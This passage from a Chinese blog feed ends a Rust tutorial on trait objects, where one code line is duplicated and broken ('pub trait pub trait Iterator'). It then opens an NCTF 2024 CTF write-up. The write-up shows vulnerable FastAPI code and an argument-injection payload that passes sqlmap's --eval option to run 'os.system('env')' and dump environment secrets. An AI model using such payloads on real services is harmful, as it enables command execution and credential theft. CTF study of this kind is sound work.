<span class="keyword">self</span>.components.<span class="title function_ invoke__">iter</span>() &#123;</span><br><span class="line">            component.<span class="title function_ invoke__">draw</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至此，我们就完成了之前的目标：在列表中存储多种不同类型的实力，然后将他们使用同一个方法逐一渲染到屏幕上</p><p>我们再来看看，如果通过泛型实现，会如何：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Screen</span>&lt;T: Draw&gt; &#123;</span><br><span class="line">    <span class="keyword">pub</span> components: <span class="type">Vec</span>&lt;T&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;T&gt; Screen&lt;T&gt;</span><br><span class="line">    <span class="keyword">where</span> T: Draw &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">run</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">component</span> <span class="keyword">in</span> <span class="keyword">self</span>.components.<span class="title function_ invoke__">iter</span>() &#123;</span><br><span class="line">            component.<span class="title function_ invoke__">draw</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的Screen的列表中，存储了类型为T的元素，然后再Screen中使用特征约束让T实现了 <code>Draw</code> 特征，进而可以调用 <code>draw</code> 方法。                                               </p><p>但是这种写法限制了 <code>Screen</code> 实例的 <code>Vec&lt;T&gt;</code> 中的每个元素必须是 <code>Button</code> 类型或者全是 <code>SelectBox</code> 类型。如果只需要同质（相同类型）集合，更倾向于采用泛型+特征约束这种写法，因其实现更清晰，且性能更好(特征对象，需要在运行时从 <code>vtable</code> 动态查找需要调用的方法)。</p><p>现在来运行渲染下咱们精心设计的 UI 组件列表：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">screen</span> = Screen &#123;</span><br><span class="line">        components: <span class="built_in">vec!</span>[</span><br><span class="line">            <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(SelectBox &#123;</span><br><span class="line">                width: <span class="number">75</span>,</span><br><span class="line">                height: <span class="number">10</span>,</span><br><span class="line">                options: <span class="built_in">vec!</span>[</span><br><span class="line">                    <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Yes&quot;</span>),</span><br><span class="line">                    <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Maybe&quot;</span>),</span><br><span class="line">                    <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;No&quot;</span>)</span><br><span class="line">                ],</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(Button &#123;</span><br><span class="line">                width: <span class="number">50</span>,</span><br><span class="line">                height: <span class="number">10</span>,</span><br><span class="line">                label: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;OK&quot;</span>),</span><br><span class="line">            &#125;),</span><br><span class="line">        ],</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    screen.<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面使用 <code>Box::new(T)</code> 的方式来创建了两个 <code>Box&lt;dyn Draw&gt;</code> 特征对象，如果以后还需要增加一个 UI 组件，那么让该组件实现 <code>Draw</code> 特征，则可以很轻松的将其渲染在屏幕上，甚至用户可以引入我们的库作为三方库，然后在自己的库中为自己的类型实现 <code>Draw</code> 特征，然后进行渲染。</p><p>在动态类型语言中，有一个很重要的概念：<strong>鸭子类型</strong>(<em>duck typing</em>)，简单来说，就是只关心值长啥样，而不关心它实际是什么。当一个东西走起来像鸭子，叫起来像鸭子，那么它就是一只鸭子，就算它实际上是一个奥特曼，也不重要，我们就当它是鸭子。</p><p>在上例中，<code>Screen</code> 在 <code>run</code> 的时候，我们并不需要知道各个组件的具体类型是什么。它也不检查组件到底是 <code>Button</code> 还是 <code>SelectBox</code> 的实例，只要它实现了 <code>Draw</code> 特征，就能通过 <code>Box::new</code> 包装成 <code>Box&lt;dyn Draw&gt;</code> 特征对象，然后被渲染在屏幕上。</p><p>使用特征对象和 Rust 类型系统来进行类似鸭子类型操作的优势是，无需在运行时检查一个值是否实现了特定方法或者担心在调用时因为值没有实现方法而产生错误。如果值没有实现特征对象所需的特征， 那么 Rust 根本就不会编译这些代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">screen</span> = Screen &#123;</span><br><span class="line">        components: <span class="built_in">vec!</span>[</span><br><span class="line">            <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hi&quot;</span>)),</span><br><span class="line">        ],</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    screen.<span class="title function_ invoke__">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 <code>String</code> 类型没有实现 <code>Draw</code> 特征，编译器直接就会报错，不会让上述代码运行。如果想要 <code>String</code> 类型被渲染在屏幕上，那么只需要为其实现 <code>Draw</code> 特征即可，非常容易。</p><p>注意 <code>dyn</code> 不能单独作为特征对象的定义，例如下面的代码编译器会报错，原因是特征对象可以是任意实现了某个特征的类型，编译器在编译期不知道该类型的大小，不同的类型大小是不同的。</p><p>而 <code>&amp;dyn</code> 和 <code>Box&lt;dyn&gt;</code> 在编译期都是已知大小，所以可以用作特征对象的定义。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">draw2</span>(x: <span class="keyword">dyn</span> Draw) &#123;</span><br><span class="line">    x.<span class="title function_ invoke__">draw</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">10</span> | <span class="keyword">fn</span> <span class="title function_">draw2</span>(x: <span class="keyword">dyn</span> Draw) &#123;</span><br><span class="line">   |          ^ doesn<span class="symbol">&#x27;t</span> have a size known at compile-time</span><br><span class="line">   |</span><br><span class="line">   = help: the <span class="keyword">trait</span> `<span class="built_in">Sized</span>` is not implemented <span class="keyword">for</span> `(<span class="keyword">dyn</span> Draw + <span class="symbol">&#x27;static</span>)`</span><br><span class="line">help: function arguments must have a statically known size, borrowed types always have a known size</span><br></pre></td></tr></table></figure><h5 id="特征对象的动态分发"><a href="#特征对象的动态分发" class="headerlink" title="特征对象的动态分发"></a>特征对象的动态分发</h5><p>我们之前学过泛型，是在编译期完成处理的:编译期会为每一个泛型参数对应的具体类型生成一份代码，这种方式是<strong>静态分发</strong>，由于是在编译期完成的，对于运行期性能完全没有影响</p><p>与静态分发相对应的是<strong>动态分发</strong>，在这种情况下，直到运行时，才能确定需要调用什么方法，之前代码的dyn正是在强调这一”动态特点”</p><p>当使用特征对象时，Rust必须使用动态分发。编译器无法知晓所有可能用于特征对象代码的类型，所以它也不知道应该调用哪个类型的哪个方法实现。为此，Rust 在运行时使用特征对象中的指针来知晓需要调用哪个方法。动态分发也阻止编译器有选择的内联方法代码，这会相应的禁用一些优化。</p><p>下面这张图很好的解释了静态分发 <code>Box&lt;T&gt;</code> 和动态分发 <code>Box&lt;dyn Trait&gt;</code> 的区别：</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504162034162.png" alt="image-20250416203409035" loading="lazy"></p><p>结合上文的内容和这张图可以了解：</p><ul><li><strong>特征对象大小不固定</strong>：这是因为，对于特征 <code>Draw</code>，类型 <code>Button</code> 可以实现特征 <code>Draw</code>，类型 <code>SelectBox</code> 也可以实现特征 <code>Draw</code>，因此特征没有固定大小</li><li>几乎总是使用特征对象的引用方式，如&amp;dyn Draw、Box&lt;dyn Draw&gt;<ul><li>虽然特征对象没有固定大小，但它的引用类型的大小是固定的，它由两个指针组成（<code>ptr</code> 和 <code>vptr</code>），因此占用两个指针大小</li><li>一个指针 <code>ptr</code> 指向实现了特征 <code>Draw</code> 的具体类型的实例，也就是当作特征 <code>Draw</code> 来用的类型的实例，比如类型 <code>Button</code> 的实例、类型 <code>SelectBox</code> 的实例</li><li>另一个指针 <code>vptr</code> 指向一个虚表 <code>vtable</code>，<code>vtable</code> 中保存了类型 <code>Button</code> 或类型 <code>SelectBox</code> 的实例对于可以调用的实现于特征 <code>Draw</code> 的方法。当调用方法时，直接从 <code>vtable</code> 中找到方法并调用。之所以要使用一个 <code>vtable</code> 来保存各实例的方法，是因为实现了特征 <code>Draw</code> 的类型有多种，这些类型拥有的方法各不相同，当将这些类型的实例都当作特征 <code>Draw</code> 来使用时(此时，它们全都看作是特征 <code>Draw</code> 类型的实例)，有必要区分这些实例各自有哪些方法可调用</li></ul></li></ul><p>简而言之，当类型 <code>Button</code> 实现了特征 <code>Draw</code> 时，类型 <code>Button</code> 的实例对象 <code>btn</code> 可以当作特征 <code>Draw</code> 的特征对象类型来使用，<code>btn</code> 中保存了作为特征对象的数据指针（指向类型 <code>Button</code> 的实例数据）和行为指针（指向 <code>vtable</code>）。</p><p>一定要注意，此时的 <code>btn</code> 是 <code>Draw</code> 的特征对象的实例，而不再是具体类型 <code>Button</code> 的实例，而且 <code>btn</code> 的 <code>vtable</code> 只包含了实现自特征 <code>Draw</code> 的那些方法（比如 <code>draw</code>），因此 <code>btn</code> 只能调用实现于特征 <code>Draw</code> 的 <code>draw</code> 方法，而不能调用类型 <code>Button</code> 本身实现的方法和类型 <code>Button</code> 实现于其他特征的方法。<strong>也就是说，<code>btn</code> 是哪个特征对象的实例，它的 <code>vtable</code> 中就包含了该特征的方法。</strong></p><h5 id="Self-与-self"><a href="#Self-与-self" class="headerlink" title="Self 与 self"></a>Self 与 self</h5><p>在 Rust 中，有两个<code>self</code>，一个指代当前的实例对象，一个指代特征或者方法类型的别名：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> <span class="title class_">Draw</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Clone)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Button</span>;</span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Draw</span> <span class="keyword">for</span> <span class="title class_">Button</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.<span class="title function_ invoke__">clone</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">button</span> = Button;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">newb</span> = button.<span class="title function_ invoke__">draw</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中，<code>self</code>指代的就是当前的实例对象，也就是 <code>button.draw()</code> 中的 <code>button</code> 实例，<code>Self</code> 则指代的是 <code>Button</code> 类型。</p><p>当理解了 <code>self</code> 与 <code>Self</code> 的区别后，我们再来看看何为对象安全。</p><h5 id="特征对象的限制"><a href="#特征对象的限制" class="headerlink" title="特征对象的限制"></a>特征对象的限制</h5><p>不是所有特征都能拥有特征对象，只有对象安全的特征才行。当一个特征的所有方法都有如下属性时，它的对象才是安全的：</p><ul><li>方法的返回类型不能是 <code>Self</code></li><li>方法没有任何泛型参数</li></ul><p>对象安全对于特征对象是必须的，因为一旦有了特征对象，就不再需要知道实现该特征的具体类型是什么了。如果特征方法返回了具体的 <code>Self</code> 类型，但是特征对象忘记了其真正的类型，那这个 <code>Self</code> 就非常尴尬，因为没人知道它是谁了。但是对于泛型类型参数来说，当使用特征时其会放入具体的类型参数：此具体类型变成了实现该特征的类型的一部分。而当使用特征对象时其具体类型被抹去了，故而无从得知放入泛型参数类型到底是什么。</p><p>标准库中的 <code>Clone</code> 特征就不符合对象安全的要求：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">Clone</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">clone</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为它的其中一个方法，返回了 <code>Self</code> 类型，因此它是对象不安全的。</p><p><code>String</code> 类型实现了 <code>Clone</code> 特征， <code>String</code> 实例上调用 <code>clone</code> 方法时会得到一个 <code>String</code> 实例。类似的，当调用 <code>Vec&lt;T&gt;</code> 实例的 <code>clone</code> 方法会得到一个 <code>Vec&lt;T&gt;</code> 实例。<code>clone</code> 的签名需要知道什么类型会代替 <code>Self</code>，因为这是它的返回值。</p><p>如果违反了对象安全的规则，编译器会提示你。例如，如果尝试使用之前的 <code>Screen</code> 结构体来存放实现了 <code>Clone</code> 特征的类型：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> components: <span class="type">Vec</span>&lt;<span class="type">Box</span>&lt;<span class="keyword">dyn</span> <span class="built_in">Clone</span>&gt;&gt;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将会得到如下错误：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error[E0038]: the trait `std::clone::Clone` cannot be made into an object</span><br><span class="line"> --&gt; src/lib.rs:2:5</span><br><span class="line">  |</span><br><span class="line">2 |     pub components: Vec&lt;Box&lt;dyn Clone&gt;&gt;,</span><br><span class="line">  |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ the trait `std::clone::Clone`</span><br><span class="line">  cannot be made into an object</span><br><span class="line">  |</span><br><span class="line">  = note: the trait cannot require that `Self : Sized`</span><br></pre></td></tr></table></figure><p>这意味着不能以这种方式使用此特征作为特征对象。</p><h5 id="深入了解特征"><a href="#深入了解特征" class="headerlink" title="深入了解特征"></a>深入了解特征</h5><h6 id="关联类型"><a href="#关联类型" class="headerlink" title="关联类型"></a>关联类型</h6><p>关联类型是在特征定义的语句块中声明一个自定义类型，这样就可以在特征的方法签名中使用该类型：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">pub</span> <span class="keyword">trait</span> <span class="title class_">Iterator</span> &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Item</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">next</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="keyword">Self</span>::Item&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是标准库中迭代器特征Iterator，它有一个Item关联类型，用于替代遍历的值的类型</p><p>同时，next也返回了一个Item类型，不过使用了Option枚举进行了包裹，假如迭代器中的值是i32类型，那么调用next方法就将获取到一个Option&lt;i32&gt;的值</p><p><strong>Self用来指代当前调用者的具体类型，那么Self::Item就用来指代该类型实现中定义的Item类型：</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Iterator</span> <span class="keyword">for</span> <span class="title class_">Counter</span> &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Item</span> = <span class="type">u32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">next</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;<span class="keyword">Self</span>::Item&gt; &#123;</span><br><span class="line">        <span class="comment">// --snip--</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">c</span> = Counter&#123;..&#125;</span><br><span class="line">    c.<span class="title function_ invoke__">next</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，我们为Counter类型实现了Iterator特征，变量c是特征Iterator的实力，也是next方法的调用者。结合之前的黑体内容可以得到：对于next方法而言，Self是调用者c的具体类型 <code>Counter</code>，而 <code>Self::Item</code> 是 <code>Counter</code> 中定义的 <code>Item</code> 类型: <code>u32</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;基本介绍&quot;&gt;&lt;a href=&quot;#基本介绍&quot; class=&quot;headerlink&quot; title=&quot;基本介绍&quot;&gt;&lt;/a&gt;基本介绍&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Rust&lt;/strong&gt; 是由 Mozilla 团队于 2010 年推出的系统级编程语言，专注于 &lt;str</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="rust" scheme="https://kinseyy.github.io/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>NCTF 2024</title>
    <link href="https://kinseyy.github.io/2025/03/25/NCTF-2024/"/>
    <id>https://kinseyy.github.io/2025/03/25/NCTF-2024/</id>
    <published>2025-03-24T23:57:30.000Z</published>
    <updated>2025-04-10T11:45:30.347Z</updated>
    
    <content type="html"><![CDATA[<h3 id="NCTF2024"><a href="#NCTF2024" class="headerlink" title="NCTF2024"></a>NCTF2024</h3><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="sqlmap-master（sqlmap命令执行漏洞）"><a href="#sqlmap-master（sqlmap命令执行漏洞）" class="headerlink" title="sqlmap-master（sqlmap命令执行漏洞）"></a>sqlmap-master（sqlmap命令执行漏洞）</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们发现有个subprocess.Popen，但因为设置了shell&#x3D;false，所以导致了无法利用反引号等技巧进行常规的命令注入</p><blockquote><p>在使用 <code>subprocess.Popen</code> 时，<code>shell=False</code> 是默认设置。这意味着传递给 <code>Popen</code> 的命令将不会通过 shell 来执行，而是作为一个直接的可执行文件和参数传递给操作系统。</p></blockquote><p>但是仔细观察可以发现我们还是可以控制sqlmap的参数，即参数注入</p><p>我们结合GTFOBins:<a href="https://gtfobins.github.io/gtfobins/sqlmap/">https://gtfobins.github.io/gtfobins/sqlmap/</a></p><p>通过 –eval 参数可以执⾏ Python 代码, 然后因为上⾯ command.split() 默认是按空格分隔的, 所以需要⼀些⼩技巧来绕过</p><p>注意这⾥参数的值不需要加上单双引号, 因为上⾯已经设置了 shell&#x3D;False , 如果加上去反⽽代表的是 “eval ⼀个 Python 字符串</p><p>最终payloiad</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8000 --eval __import__(&#x27;os&#x27;).system(&#x27;env&#x27;)</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503250835953.png" alt="image-20250325083538862" loading="lazy"></p><h4 id="ez-dash-ez-dash-revenge-TEMPLATE-PATH链污染"><a href="#ez-dash-ez-dash-revenge-TEMPLATE-PATH链污染" class="headerlink" title="ez_dash&amp;ez_dash_revenge(TEMPLATE_PATH链污染)"></a>ez_dash&amp;ez_dash_revenge(TEMPLATE_PATH链污染)</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span 